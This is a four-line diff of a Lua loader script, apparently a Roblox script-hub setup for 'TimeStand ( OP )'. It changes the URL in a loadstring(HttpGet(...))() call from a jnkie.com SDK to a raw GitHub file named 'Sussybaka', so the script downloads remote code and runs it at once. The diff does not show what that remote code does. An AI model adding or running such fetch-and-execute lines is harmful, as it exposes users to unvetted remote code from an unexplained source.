@@ -1,4 +1,4 @@
-local Junkie = loadstring(game:HttpGet("https://jnkie.com/sdk/library.lua"))()
+local Junkie = loadstring(game:HttpGet("https://raw.githubusercontent.com/1exeexe1/msx-config/refs/heads/main/Sussybaka"))()
 Junkie.service = "TimeStand ( OP )"
 Junkie.identifier = "1012798"
 Junkie.provider = "OP TimeStand"
